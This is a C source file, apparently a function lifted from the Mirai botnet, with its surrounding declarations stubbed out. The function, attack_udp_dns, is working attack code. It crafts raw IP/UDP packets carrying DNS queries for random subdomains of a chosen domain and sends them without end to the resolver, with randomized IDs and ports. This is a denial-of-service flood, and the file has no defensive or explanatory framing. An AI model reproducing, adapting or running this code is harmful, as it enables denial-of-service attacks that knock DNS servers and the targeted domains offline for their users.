
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; void* daddr; int saddr; int protocol; void* frag_off; void* tot_len; } ;
struct dnshdr {int id; void* qdcount; void* opts; } ;
struct dns_question {void* qclass; void* qtype; } ;
struct TYPE_3__ {void* s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; } ;
struct attack_target {TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* ipv4_t ;
typedef void* BOOL ;


 int AF_INET ;
 int ATK_OPT_DNS_HDR_ID ;
 int ATK_OPT_DOMAIN ;
 int ATK_OPT_DPORT ;
 int ATK_OPT_IP_DF ;
 int ATK_OPT_IP_IDENT ;
 int ATK_OPT_IP_TOS ;
 int ATK_OPT_IP_TTL ;
 int ATK_OPT_PAYLOAD_SIZE ;
 int ATK_OPT_SPORT ;
 int FALSE ;
 int IPPROTO_IP ;
 int IPPROTO_UDP ;
 int IP_HDRINCL ;
 int LOCAL_ADDR ;
 int MSG_NOSIGNAL ;
 int PROTO_DNS_QCLASS_IP ;
 int PROTO_DNS_QTYPE_A ;
 int SOCK_RAW ;
 scalar_t__ TRUE ;
 void* attack_get_opt_int (int,struct attack_option*,int ,int) ;
 char* attack_get_opt_str (int,struct attack_option*,int ,int *) ;
 void* calloc (int,int) ;
 scalar_t__ checksum_generic (int*,int) ;
 scalar_t__ checksum_tcpudp (struct iphdr*,struct udphdr*,void*,int) ;
 int close (int) ;
 scalar_t__ errno ;
 void* get_dns_resolver () ;
 void* htons (int) ;
 int printf (char*,...) ;
 int rand_alphastr (int*,int) ;
 int rand_next () ;
 int sendto (int,char*,int,int ,struct sockaddr*,int) ;
 int setsockopt (int,int ,int ,int*,int) ;
 int socket (int ,int ,int ) ;
 int util_memcpy (char*,char*,int) ;
 int util_strlen (char*) ;

void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, ((void*)0));
    int domain_len;
    ipv4_t dns_resolver = get_dns_resolver();

    if (domain == ((void*)0))
    {



        return;
    }
    domain_len = util_strlen(domain);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {



        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {



        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;

        pkts[i] = calloc(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8);
        dnsh->qdcount = htons(1);


        *qname++ = data_len;
        qname += data_len;

        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1);


        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;

        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;

            rand_alphastr((uint8_t *)qrand, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
